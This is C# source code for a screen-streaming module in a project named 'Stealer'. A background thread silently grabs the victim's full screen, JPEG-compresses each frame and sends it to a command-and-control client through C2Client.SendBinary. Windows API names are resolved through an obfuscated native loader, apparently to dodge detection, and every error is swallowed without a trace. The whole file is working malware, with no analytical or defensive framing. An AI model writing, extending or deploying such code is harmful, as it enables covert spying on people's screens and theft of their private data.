using System;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Threading;

namespace Stealer.Utils
{
    public enum StreamMode
    {
        StandardFast = 0,
        TileDelta = 1,
        HighQualityText = 2
    }

    public static class ScreenStream
    {
        private static Thread _captureThread;
        private static volatile bool _running;
        private static StreamMode _currentMode = StreamMode.TileDelta;
        private static byte[] _previousTileHashes = null;

        public static void Start(int fps, int quality, StreamMode mode = StreamMode.TileDelta)
        {
            if (_running) return;
            _currentMode = mode;
            _running = true;
            _captureThread = new Thread(() => CaptureLoop(fps, quality)) { IsBackground = true };
            _captureThread.Start();
        }

        public static void SetMode(StreamMode mode)
        {
            _currentMode = mode;
            _previousTileHashes = null;
        }

        public static void Stop()
        {
            _running = false;
        }

        private static void CaptureLoop(int fps, int quality)
        {
            int delay = 1000 / Math.Max(fps, 1);

            var jpegEncoder = GetJpegEncoder();
            var qualityParam = new EncoderParameters(1);
            qualityParam.Param[0] = new EncoderParameter(Encoder.Quality, (long)Math.Max(10, Math.Min(quality, 100)));

            while (_running)
            {
                try
                {
                    byte[] frameData = CaptureScreen(jpegEncoder, qualityParam, _currentMode);
                    if (frameData != null)
                    {
                        C2Client.SendBinary(frameData);
                    }
                }
                catch { }
                Thread.Sleep(delay);
            }
        }

        private static byte[] CaptureScreen(ImageCodecInfo encoder, EncoderParameters encParams, StreamMode mode)
        {
            try
            {
                int srcW = GetScreenWidth();
                int srcH = GetScreenHeight();
                if (srcW <= 0 || srcH <= 0) return null;

                int targetW = srcW;
                int targetH = srcH;

                if (mode != StreamMode.HighQualityText && srcW > 1280)
                {
                    targetW = 1280;
                    targetH = (int)((double)srcH * 1280 / srcW);
                }

                if (targetW == srcW && targetH == srcH)
                {
                    using (var bmp = new Bitmap(srcW, srcH, PixelFormat.Format24bppRgb))
                    {
                        using (var g = Graphics.FromImage(bmp))
                        {
                            g.CopyFromScreen(0, 0, 0, 0, new Size(srcW, srcH), CopyPixelOperation.SourceCopy);
                        }
                        using (var ms = new MemoryStream())
                        {
                            bmp.Save(ms, encoder, encParams);
                            return ms.ToArray();
                        }
                    }
                }
                else
                {
                    using (var srcBmp = new Bitmap(srcW, srcH, PixelFormat.Format24bppRgb))
                    {
                        using (var g = Graphics.FromImage(srcBmp))
                        {
                            g.CopyFromScreen(0, 0, 0, 0, new Size(srcW, srcH), CopyPixelOperation.SourceCopy);
                        }
                        using (var resizedBmp = new Bitmap(targetW, targetH, PixelFormat.Format24bppRgb))
                        {
                            using (var gResize = Graphics.FromImage(resizedBmp))
                            {
                                gResize.InterpolationMode = System.Drawing.Drawing2D.InterpolationMode.Low;
                                gResize.SmoothingMode = System.Drawing.Drawing2D.SmoothingMode.HighSpeed;
                                gResize.PixelOffsetMode = System.Drawing.Drawing2D.PixelOffsetMode.HighSpeed;
                                gResize.DrawImage(srcBmp, 0, 0, targetW, targetH);
                            }
                            using (var ms = new MemoryStream())
                            {
                                resizedBmp.Save(ms, encoder, encParams);
                                return ms.ToArray();
                            }
                        }
                    }
                }
            }
            catch
            {
                return null;
            }
        }

        private static int GetScreenWidth()
        {
            var getMetrics = NativeLoader.Resolve<GetSystemMetricsDelegate>(NativeLoader.Lib_U32, NativeLoader.Fn_GSM);
            return getMetrics != null ? getMetrics(0) : 1920;
        }

        private static int GetScreenHeight()
        {
            var getMetrics = NativeLoader.Resolve<GetSystemMetricsDelegate>(NativeLoader.Lib_U32, NativeLoader.Fn_GSM);
            return getMetrics != null ? getMetrics(1) : 1080;
        }

        private delegate int GetSystemMetricsDelegate(int nIndex);

        private static ImageCodecInfo GetJpegEncoder()
        {
            foreach (var codec in ImageCodecInfo.GetImageEncoders())
            {
                if (codec.MimeType == "image/jpeg") return codec;
            }
            return null;
        }
    }
}
